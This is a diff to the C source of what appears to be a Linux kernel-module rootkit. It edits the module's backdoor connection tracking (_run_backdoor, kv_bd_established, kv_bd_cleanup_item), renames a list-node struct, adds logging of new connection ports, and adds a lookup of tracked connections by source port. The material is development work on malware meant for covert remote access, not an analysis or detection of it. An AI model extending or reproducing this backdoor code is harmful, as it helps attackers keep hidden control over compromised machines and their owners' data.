@@ -22,7 +22,7 @@
 #include "log.h"
 
 static LIST_HEAD(iph_node);
-struct iph_node_t {
+struct iph_node_list {
 	struct iphdr *iph;
 	struct tcphdr *tcph;
 	bool established;
@@ -313,14 +313,16 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select)
 
 static int _bd_add_new_iph(struct iphdr *iph, struct tcphdr *tcph)
 {
-	struct iph_node_t *ip =
-		kcalloc(1, sizeof(struct iph_node_t), GFP_KERNEL);
+	struct iph_node_list *ip =
+		kcalloc(1, sizeof(struct iph_node_list), GFP_KERNEL);
 	if (!ip)
 		goto error;
 
 	ip->iph = iph;
 	ip->tcph = tcph;
 	ip->established = false;
+	prinfo("Adding new connection port source=%u, dest=%u\n",
+	       ntohs(ip->tcph->source), ntohs(ip->tcph->dest));
 	list_add_tail(&ip->list, &iph_node);
 	return 0;
 error:
@@ -330,9 +332,20 @@ error:
 
 bool kv_bd_search_iph_source(__be32 saddr)
 {
-	struct iph_node_t *node, *node_safe;
+	struct iph_node_list *node, *node_safe;
 	list_for_each_entry_safe_reverse (node, node_safe, &iph_node, list) {
 		if (node->iph->saddr == saddr) {
+			return true;
+		}
+	}
+	return false;
+}
+
+bool kv_bd_search_iph_source_by_port(int port)
+{
+	struct iph_node_list *node, *node_safe;
+	list_for_each_entry_safe_reverse (node, node_safe, &iph_node, list) {
+		if (port == ntohs(node->tcph->source)) {
 			return true;
 		}
 	}
@@ -342,7 +355,7 @@ bool kv_bd_search_iph_source(__be32 saddr)
 bool kv_bd_established(__be32 *daddr, int dport, bool established)
 {
 	bool rc = false;
-	struct iph_node_t *node, *node_safe;
+	struct iph_node_list *node, *node_safe;
 
 	list_for_each_entry_safe_reverse (node, node_safe, &iph_node, list) {
 		/*
@@ -379,7 +392,7 @@ bool kv_bd_established(__be32 *daddr, int dport, bool established)
  */
 void kv_bd_cleanup_item(__be32 *saddr)
 {
-	struct iph_node_t *node, *node_safe;
+	struct iph_node_list *node, *node_safe;
 	list_for_each_entry_safe_reverse (node, node_safe, &iph_node, list) {
 		if (node->iph->saddr == *saddr) {
 			list_del(&node->list);
@@ -397,7 +410,7 @@ void kv_bd_cleanup_item(__be32 *saddr)
  */
 void _bd_cleanup(bool force)
 {
-	struct iph_node_t *node, *node_safe;
+	struct iph_node_list *node, *node_safe;
 	list_for_each_entry_safe (node, node_safe, &iph_node, list) {
 		if (!node->established && force) {
 			list_del(&node->list);
